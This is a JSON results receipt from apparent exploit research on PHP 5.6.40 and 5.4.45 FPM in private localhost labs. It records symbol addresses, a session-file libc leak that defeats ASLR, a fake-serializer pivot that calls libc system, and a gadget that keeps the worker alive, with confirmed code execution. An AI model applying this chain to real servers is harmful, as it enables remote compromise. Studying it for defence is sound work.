@@ -1,0 +1,476 @@
+{
+  "receipt": "php5exec_20261022_0131",
+  "date": "2026-10-22",
+  "scope": "Live private FPM labs for PHP 5.6.40 and 5.4.45 (non-PIE ET_EXEC, DWARF): decode-slot libc system with ASLR off and on, session-file libc leak, native dtor -> PS(serializer) pivots on both versions, worker survival, ABI result, and final 5.x verdict.",
+  "privacy": "Offline/private; FPM pools and static HTTP servers bound to 127.0.0.1 only. ASLR-off phase: setarch -R. ASLR-on phase: personality 00000000, randomize_va_space=2; libc base derived from the served session-file leak.",
+  "geometry_receipt": {
+    "path": "/tmp/opencode/research/php5geo_20261022_0045",
+    "copied_as": [
+      "phase/zifsys5.json",
+      "phase/geometry_receipt_README.md"
+    ]
+  },
+  "binaries": {
+    "php-5.6.40": {
+      "path": "/tmp/opencode/research/php5geo_20261022_0045/build/php-5.6.40/sapi/fpm/php-fpm",
+      "sha256": "b9261e1cb91672c6a297bde724db3cd26833d329b832bc4bcde0183af3703723",
+      "elf": "ELF64 ET_EXEC x86-64, non-PIE, DWARF",
+      "imports": {
+        "system": false,
+        "execve": false,
+        "execv": false,
+        "execvp": false,
+        "posix_spawn": false,
+        "popen": {
+          "symbol": "popen@GLIBC_2.2.5",
+          "plt": "0x417f30",
+          "got": "0x816780",
+          "decode_call_compatible": false,
+          "reason": "popen(command, mode) receives the integer vallen as mode, not a valid string pointer"
+        }
+      },
+      "defined_symbols": {
+        "zif_system": "0x4f195f",
+        "zif_passthru": "0x4f1970",
+        "php_exec": "0x4f14ec",
+        "zend_eval_string": "0x592000",
+        "zend_eval_stringl": "0x591cf5"
+      },
+      "session_geometry": {
+        "ps_serializers": "0x816dc0",
+        "php_binary_entry": "0x816df0",
+        "php_binary_decode_slot": "0x816e00",
+        "php_binary_encode": "0x4afaff",
+        "php_binary_decode_original": "0x4af399",
+        "ps_globals": "0x82e4e0",
+        "PS_serializer": "0x82e5c0",
+        "PS_http_session_vars": "0x82e5c8",
+        "PS_mod_data": "0x82e548",
+        "PS_mod_user_implemented": "0x82e5b8",
+        "PS_mod_user_is_open": "0x82e5bc",
+        "php_session_decode": "0x4ace04",
+        "php_session_encode": "0x4ac6e3",
+        "php_session_flush": "0x4ac76a",
+        "var_push_dtor": "0x531840",
+        "var_push_dtor_no_addref": "0x5318e7",
+        "php_var_unserialize": "0x531b18",
+        "BG_unserialize": "0x82fd28",
+        "BG_unserialize_level": "0x82fd30"
+      }
+    },
+    "php-5.4.45": {
+      "path": "/tmp/opencode/research/php5geo_20261022_0045/build/php-5.4.45/sapi/fpm/php-fpm",
+      "sha256": "60e225762c90d24912b70b3ef5105db848f57b663182bc8eaee09f567224abaf",
+      "elf": "ELF64 ET_EXEC x86-64, non-PIE, DWARF",
+      "imports": {
+        "system": false,
+        "execve": false,
+        "execv": false,
+        "execvp": false,
+        "posix_spawn": false,
+        "popen": {
+          "symbol": "popen@GLIBC_2.2.5",
+          "plt": "0x417ee0",
+          "got": "0x79e758",
+          "decode_call_compatible": false,
+          "reason": "popen(command, mode) receives the integer vallen as mode, not a valid string pointer"
+        }
+      },
+      "defined_symbols": {
+        "zif_system": "0x4edbdb",
+        "zif_passthru": "0x4edbec",
+        "php_exec": "0x4ed775",
+        "zend_eval_string": "0x58ae00",
+        "zend_eval_stringl": "0x58aaf4"
+      },
+      "session_geometry": {
+        "ps_serializers": "0x79eda0",
+        "php_entry": "0x79eda0",
+        "php_binary_entry": "0x79edb8",
+        "php_binary_decode_slot": "0x79edc8",
+        "php_binary_encode": "0x4ae6fa",
+        "php_binary_decode_original": "0x4ae189",
+        "PS_serializer": "0x7b6038",
+        "PS_http_session_vars": "0x7b6040",
+        "ps_globals": "0x7b5f60",
+        "php_session_decode": "0x4aad85",
+        "php_session_encode": "0x4aaa5a",
+        "php_session_flush": "0x4aaae1",
+        "var_push_dtor": "0x52bdba",
+        "php_var_unserialize": "0x52bfb2",
+        "BG_unserialize": "0x7b7708",
+        "BG_unserialize_level": "0x7b7710"
+      }
+    }
+  },
+  "lab": {
+    "php-5.6.40": {
+      "port": 45256,
+      "master_pid": 164972,
+      "native_workers": [
+        175538,
+        185617
+      ],
+      "gdb_assisted_worker": 185617,
+      "aslr": "off (setarch -R)",
+      "libc_base": "0x7ffff7cc9000",
+      "system": "0x7ffff7d1c090"
+    },
+    "php-5.4.45": {
+      "port": 45254,
+      "master_pid": 183820,
+      "worker_pid": 183822,
+      "aslr": "off (setarch -R)",
+      "libc_base": "0x7ffff7cc9000",
+      "system": "0x7ffff7d1c090"
+    },
+    "aslr_on": {
+      "php-5.6.40": {
+        "fpm_port": 45270,
+        "http_port": 45271,
+        "master_pid": 885439,
+        "current_worker": 951888,
+        "web_root": "aslr56/root",
+        "save_path": "aslr56/root/sess",
+        "config": "phase/conf/fpm56aslr.conf",
+        "personality": "00000000",
+        "randomize_va_space": 2,
+        "libc_base": "0x7f0f89590000",
+        "system": "0x7f0f895e3090"
+      },
+      "php-5.4.45": {
+        "fpm_port": 45272,
+        "http_port": 45273,
+        "master_pid": 885474,
+        "current_worker": 952659,
+        "web_root": "aslr54/root",
+        "save_path": "aslr54/root/sess",
+        "config": "phase/conf/fpm54aslr.conf",
+        "personality": "00000000",
+        "randomize_va_space": 2,
+        "libc_base": "0x7f62abd95000",
+        "system": "0x7f62abde8090"
+      }
+    }
+  },
+  "levers": {
+    "decode_slot_system_gdb_assisted": {
+      "5.6.40": {
+        "status": "confirmed",
+        "table_decode_slot": "0x816e00",
+        "value": "0x7ffff7d1c090",
+        "session_file": "sess56/sess_sys56b",
+        "session_bytes": "touch /tmp/php5_system56_marker\\n\\0",
+        "trigger": "PHPSESSID=sys56b, start56.php",
+        "marker": "/tmp/php5_system56_marker",
+        "marker_created": true,
+        "worker": 185617,
+        "worker_survived": true,
+        "restored_decode": "0x4af399",
+        "log": "phase/5.6_decode_slot_system_gdb.log"
+      },
+      "5.4.45": {
+        "status": "confirmed",
+        "table_decode_slot": "0x79edc8",
+        "value": "0x7ffff7d1c090",
+        "session_file": "sess54/sess_sys54b",
+        "session_bytes": "touch /tmp/php5_system54_marker\\n\\0",
+        "trigger": "PHPSESSID=sys54b, start54.php",
+        "marker": "/tmp/php5_system54_marker",
+        "marker_created": true,
+        "worker": 183822,
+        "worker_survived": true,
+        "restored_decode": "0x4ae189",
+        "log": "phase/5.4_decode_slot_system_gdb.log"
+      }
+    },
+    "native_5.6.40_dtor_pivot": {
+      "status": "confirmed",
+      "reproduced": 2,
+      "table_modified_by_exploit": false,
+      "payloads": [
+        {
+          "file": "phase/sess_psys4.payload",
+          "sha256": "1329794c494fd91485ec002955b981c55e0cbb17906fc6bb799dfb2178426bc3",
+          "marker": "/tmp/p5n",
+          "worker": 175538,
+          "worker_survived": true,
+          "gdb_log": "phase/5.6_native_gdb_psys4.log",
+          "vfork_child": 184679
+        },
+        {
+          "file": "phase/sess_psys5.payload",
+          "sha256": "aee2b4b5971c74e686b44b6ed15b01fe623f323745ba8096b39841e6fcbe1e1e",
+          "marker": "/tmp/p5r",
+          "worker": 185617,
+          "worker_survived": true,
+          "gdb_log": "phase/5.6_native_gdb_psys5.log",
+          "vfork_child": 185715
+        }
+      ],
+      "geometry": {
+        "X1_first_s_read": "0x7ffff7cbb580",
+        "P_stale_unserialize_data": "0x7ffff7cbb710",
+        "X2_second_s_read": "0x7ffff7cbc338",
+        "F1_fake_serializer": "0x7ffff7cbc638",
+        "F1_encode": "0x4b4728",
+        "F1_decode": "0x7ffff7d1c090",
+        "first_fake_block": "0x7ffff7cb9780",
+        "last_fake_block": "0x7ffff7cb97a0",
+        "last_dtor_fake_block": "0x7ffff7cb9800",
+        "K0": -17592167765577,
+        "K3": 1068,
+        "dtor_pre_push_address": "0x82e5b8",
+        "dtor_top_push_address": "0x82e5c0",
+        "dtor_string_push_address": "0x82e5c8"
+      },
+      "second_decode_call": "system(val=0x7ffff7cbc338, vallen=1024) -> marker",
+      "survival_gadget": {
+        "address": "0x4b4728",
+        "effect": "movl $0,0x82e5b8; jmp 0x4b46d5; load php_session_encode ret local; leave; ret",
+        "result": "PS(mod_user_implemented)=0, PS(mod_user_is_open)=0; final flush writes 0-byte session; s_close safe"
+      },
+      "post_run": {
+        "session_file_bytes": 0,
+        "PS_mod_user_implemented": 0,
+        "PS_serializer": "0x7ffff7cbc638",
+        "PS_http_session_vars": 0,
+        "PS_mod_data": 0,
+        "ps_serializers_decode": "0x4af399",
+        "followup_request_served": true,
+        "log": "phase/5.6_native_survival_check.log"
+      }
+    },
+    "native_5.6.40_crash_variant": {
+      "status": "marker then worker crash",
+      "payload_encode": "0x4afaff (original php_binary encode, no survival gadget)",
+      "marker": "/tmp/p5n",
+      "marker_created": true,
+      "worker": 174540,
+      "crash": "SIGSEGV in ps_close_files at ext/session/mod_files.c:326 (ps_files_close(data), PS(mod_data)==NULL)",
+      "cause": "R: pre-push at PS(serializer)-8 = 0x82e5b8 corrupts PS(mod_user_implemented)/PS(mod_user_is_open); RSHUTDOWN calls s_close with NULL",
+      "log": "phase/5.6_native_crash_gdb_psys3.log"
+    },
+    "direct_table_dtor": {
+      "status": "blocked_on_5.x",
+      "reason": "5.x var_entries data is zval *[1024]; the dtor stores an 8-byte zval pointer, not a typed 16-byte zval. A direct ps_serializers[].decode target receives a heap pointer, not system; Z_ADDREF_PP/Z_SET_ISREF_PP metadata writes at F+0x10/+0x15 corrupt fake zval fields.",
+      "workaround": "write PS(serializer) with a pointer to a fake ps_serializer struct in the second s_read buffer; F1+0x10 = system"
+    },
+    "zif_system_fallback": {
+      "status": "not_needed",
+      "reason": "libc system worked at the decode slot",
+      "abi": "zif_system expects INTERNAL_FUNCTION_PARAMETERS (ht, return_value, ...), not (char *, int); ht=(int)val, return_value=(zval*)vallen, failure path writes vallen as a pointer -> SIGSEGV before exec"
+    },
+    "native_5.4_chain": {
+      "status": "confirmed",
+      "aslr": "off (setarch -R)",
+      "worker": 589497,
+      "payload": "phase/sess_native54.payload",
+      "payload_sha256": "c61199613a656ef743f5032a501a31d0d661efe89f5feb3ea6c9d41c74f4171f",
+      "generator": "phase/make_native54.py --marker /tmp/p54n_v2 --x1 0x7ffff7cbb5b0 --x2 0x7ffff7cbc320 --poff 0x1a8",
+      "geometry": {
+        "X1_first_s_read": "0x7ffff7cbb5b0",
+        "P_stale_unserialize_data": "0x7ffff7cbb758",
+        "poff": "0x1a8",
+        "X2_second_s_read": "0x7ffff7cbc320",
+        "F1_fake_serializer": "0x7ffff7cbc620",
+        "F1_encode": "0x4b16b1",
+        "F1_decode": "0x7ffff7d1c090"
+      },
+      "second_decode_call": "system(val=0x7ffff7cbc320, vallen=1024) -> marker",
+      "vfork_child": 589987,
+      "marker": "/tmp/p54n_v2",
+      "marker_created": true,
+      "worker_survived": true,
+      "session_file": "sess54/sess_nat54v1",
+      "session_file_bytes": 0,
+      "table_untouched": {
+        "decode_slot": "0x79edc8",
+        "value": "0x4ae189"
+      },
+      "post_run": {
+        "PS_serializer": "0x7ffff7cbc620",
+        "BG_unserialize": 0,
+        "ps_serializers_decode": "0x4ae189"
+      },
+      "logs": [
+        "phase/5.4_native_gdb_v3.log",
+        "phase/5.4_native_survival_check.log"
+      ]
+    },
+    "session_file_libc_leak": {
+      "status": "confirmed",
+      "design": "1024-byte php_binary session file read into X1 = s_read emalloc(file_size); stale BG(unserialize) P at X1+poff is overwritten with fake php_unserialize_data (first=X1+0x200-0x2000, last=X1+0x220-0x2000, first_dtor=0, last_dtor=X1+0x380-0x2000). R:1057 reaches fake first->data[1056] at file offset 0x300, pointing to a fake IS_STRING zval at 0x340 with value.str.val=fixed GOT base and len=4096. Dtor pushes go to the fake block at 0x380 (used_slots=0), so PS(serializer)/PS(http_session_vars) stay intact and the normal encode serializes s:4096:\"<GOT>\" into the session file.",
+      "measurements": {
+        "5.6.40": {
+          "probe_val": "0x7f0f895825c0",
+          "probe_P": "0x7f0f89582828",
+          "poff": "0x268",
+          "leak_hit2_val": "0x7f0f89584500",
+          "leak_hit2_vallen": 5435
+        },
+        "5.4.45": {
+          "probe_val": "0x7f62abd875c0",
+          "probe_P": "0x7f62abd87768",
+          "poff": "0x1a8",
+          "leak_hit2_val": "0x7f62abd89500",
+          "leak_hit2_vallen": 5435
+        }
+      },
+      "5.6.40": {
+        "payload": "phase/aslr56_leak.payload",
+        "trigger": "PHPSESSID=leak56, upload-progress multipart via fcgi_client.py + multipart.bin",
+        "leak_file": "phase/aslr56_session_leak.bin",
+        "leak_bytes": 5435,
+        "leak_sha256": "4299f2a34e0b8074b4a4848b914517bff46250d3c880e8c19209b42013b8d1b0",
+        "fetch_url": "http://127.0.0.1:45271/sess/sess_leak56",
+        "got_base": "0x815fd0",
+        "matching_got_entries": 87,
+        "resolved_libc_pointers": 105,
+        "ifunc_alternates": 18,
+        "libc_base": "0x7f0f89590000",
+        "system_offset": "0x53090",
+        "system": "0x7f0f895e3090",
+        "logs": [
+          "phase/aslr56_gdb_probe.log",
+          "phase/aslr56_gdb_leak.log"
+        ]
+      },
+      "5.4.45": {
+        "payload": "phase/aslr54_leak.payload",
+        "trigger": "PHPSESSID=leak54, upload-progress multipart via fcgi_client.py + multipart.bin",
+        "leak_file": "phase/aslr54_session_leak.bin",
+        "leak_bytes": 5435,
+        "leak_sha256": "b28c7ddbe14642b277320ceee4949be14b24807afa3c2e2fc3775fce8cce8503",
+        "fetch_url": "http://127.0.0.1:45273/sess/sess_leak54",
+        "got_base": "0x79dfd0",
+        "matching_got_entries": 84,
+        "resolved_libc_pointers": 102,
+        "ifunc_alternates": 18,
+        "libc_base": "0x7f62abd95000",
+        "system_offset": "0x53090",
+        "system": "0x7f62abde8090",
+        "logs": [
+          "phase/aslr54_gdb_probe.log",
+          "phase/aslr54_gdb_leak.log"
+        ]
+      },
+      "side_effect": "The second rfc1867 decode re-reads the rewritten 5435-byte file while the stale P still points into the freed/reused 1024-byte chunk; the worker SIGSEGVs after the leak has been written and flushed. The file is fetched over HTTP after the crash and FPM replaces the worker automatically.",
+      "analysis": "phase/aslr_leak_analysis.txt"
+    },
+    "decode_slot_system_aslr_on": {
+      "status": "confirmed",
+      "5.6.40": {
+        "worker": 948800,
+        "table_decode_slot": "0x816e00",
+        "value": "0x7f0f895e3090",
+        "session_file": "aslr56/root/sess/sess_sys56a",
+        "session_bytes": "touch /tmp/php5_aslr56_marker\\n\\0",
+        "trigger": "PHPSESSID=sys56a, start56.php",
+        "marker": "/tmp/php5_aslr56_marker",
+        "marker_created": true,
+        "worker_survived_trigger": true,
+        "followup_request": "info.php 200 at 02:52:44",
+        "later": "SIGKILLed intentionally at 02:53:52 for a clean native-measurement worker",
+        "restored_decode": "0x4af399",
+        "log": "phase/aslr56_system.log"
+      },
+      "5.4.45": {
+        "worker": 950266,
+        "table_decode_slot": "0x79edc8",
+        "value": "0x7f62abde8090",
+        "session_file": "aslr54/root/sess/sess_sys54a",
+        "session_bytes": "touch /tmp/php5_aslr54_marker\\n\\0",
+        "trigger": "PHPSESSID=sys54a, start54.php",
+        "marker": "/tmp/php5_aslr54_marker",
+        "marker_created": true,
+        "worker_survived_trigger": true,
+        "followup_request": "trigger54.php 200 at 02:52:44",
+        "later": "SIGKILLed intentionally at 02:54:38 for a clean native-measurement worker",
+        "restored_decode": "0x4ae189",
+        "log": "phase/aslr54_system.log"
+      }
+    },
+    "native_aslr_on": {
+      "status": "confirmed",
+      "table_modified_by_exploit": false,
+      "design": "measurement payload (F1=X1+0x300, real decode/encode) crashes the worker after the X2 hit; real payload uses F1=X2+0x300, F1+8=survival gadget, F1+0x10=leak-derived system",
+      "5.6.40": {
+        "measurement_worker": 951691,
+        "real_worker": 951888,
+        "X1": "0x7f0f895825c0",
+        "P": "0x7f0f89582828",
+        "poff": "0x268",
+        "X2": "0x7f0f89583350",
+        "X2_minus_X1": "0xd90",
+        "F1": "0x7f0f89583650",
+        "F1_encode": "0x4b4728",
+        "F1_decode": "0x7f0f895e3090",
+        "marker": "/tmp/php5_aslr56_native",
+        "marker_created": true,
+        "worker_survived": true,
+        "session_file_bytes": 0,
+        "payload": "phase/aslr56_native.payload",
+        "measure_payload": "phase/aslr56_measure.payload",
+        "log": "phase/aslr56_gdb_native.log"
+      },
+      "5.4.45": {
+        "measurement_worker": 952493,
+        "real_worker": 952659,
+        "X1": "0x7f62abd875c0",
+        "P": "0x7f62abd87768",
+        "poff": "0x1a8",
+        "X2": "0x7f62abd88330",
+        "X2_minus_X1": "0xd70",
+        "F1": "0x7f62abd88630",
+        "F1_encode": "0x4b16b1",
+        "F1_decode": "0x7f62abde8090",
+        "marker": "/tmp/php5_aslr54_native",
+        "marker_created": true,
+        "worker_survived": true,
+        "session_file_bytes": 0,
+        "payload": "phase/aslr54_native.payload",
+        "measure_payload": "phase/aslr54_measure.payload",
+        "log": "phase/aslr54_gdb_native.log"
+      }
+    }
+  },
+  "abi": {
+    "var_entries": "zval *data[1024] (8-byte pointers); used_slots at +0x2000; next at +0x2008",
+    "php_unserialize_data": "first +0x00, last +0x08, first_dtor +0x10, last_dtor +0x18",
+    "dtor_store": "var_push_dtor: Z_ADDREF_PP then *slot = *rval (pointer); var_push_dtor_no_addref: data[used_slots++] = *rval (pointer)",
+    "r_value": "if (*rval != NULL) pre-push old current; *rval = *rval_ref; Z_ADDREF_PP; Z_SET_ISREF_PP",
+    "zval_layout_5x": "value 16 bytes; refcount +0x10; type +0x14; is_ref +0x15",
+    "pointer_only": true,
+    "php8_g2_typed_value": "not_transferable",
+    "php8_g6_zif_system": "not_transferable",
+    "decode_signature": "decode(char *val, int vallen); libc system(const char *) compatible; zif_system internal-function ABI incompatible",
+    "ps_serializer_layout": "name +0x00, encode +0x08, decode +0x10",
+    "survival_requirement": "pre-push corrupts PS(mod_user_implemented) at 0x82e5b8; repair with 0x4b4728 or use the table-write lever"
+  },
+  "binary_import_evidence": {
+    "readelf_h": "ET_EXEC for both (non-PIE)",
+    "nm_D": "only popen@GLIBC_2.2.5 matches system/exec/popen/spawn",
+    "readelf_Ws": "UND popen@GLIBC_2.2.5 only",
+    "objdump_popen_plt": {
+      "5.6.40": "0x417f30 jmp *0x816780",
+      "5.4.45": "0x417ee0 jmp *0x79e758"
+    },
+    "files": [
+      "phase/imports_5.6.txt",
+      "phase/imports_5.4.txt"
+    ]
+  },
+  "verdict": {
+    "decode_slot_system_5.6.40": "confirmed with ASLR off and ASLR on (marker, worker survival)",
+    "decode_slot_system_5.4.45": "confirmed with ASLR off and ASLR on (marker, worker survival)",
+    "session_file_libc_leak": "confirmed on both versions: 87 (5.6) / 84 (5.4) GOT entries agree on one libc base; system = base+0x53090",
+    "native_5.6.40_rce_worker_survival": "confirmed twice with ASLR off and once with ASLR on",
+    "native_5.6.40_crash_without_gadget": "confirmed (post-marker ps_close_files SIGSEGV)",
+    "native_5.4.45_rce_worker_survival": "confirmed once with ASLR off and once with ASLR on",
+    "direct_table_dtor": "blocked (pointer-only 5.x ABI)",
+    "binary_system_plt": "absent; popen signature-incompatible; libc base required and leakable",
+    "aslr": "not a blocker: leak-derived system used successfully on ASLR-on pools",
+    "final": "5.x decode-slot libc system is real and natively reachable on both 5.6.40 and 5.4.45 with worker survival, with ASLR off and with ASLR on using a session-file libc leak. 8.5 G2 typed-value and G6 zif_system shapes do not transfer; no system/execve PLT; the required libc base is leakable from the binary's GOT via the session encoder."
+  }
+}
